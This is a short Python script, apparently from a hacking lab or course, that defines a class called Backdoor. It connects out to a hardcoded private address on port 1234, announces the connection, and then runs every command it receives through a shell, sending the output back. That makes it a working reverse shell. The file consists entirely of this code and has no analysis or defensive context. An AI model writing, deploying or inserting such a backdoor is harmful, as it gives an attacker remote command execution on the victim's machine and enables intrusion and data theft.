#!/usr/bin/env python3

import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.connection.send(bytes("\n[+] Connection established.\n", "utf-8"))

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command = command.decode()
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)

        self.connection.close()

my_backdoor = Backdoor("192.168.204.218", 1234)
my_backdoor.run()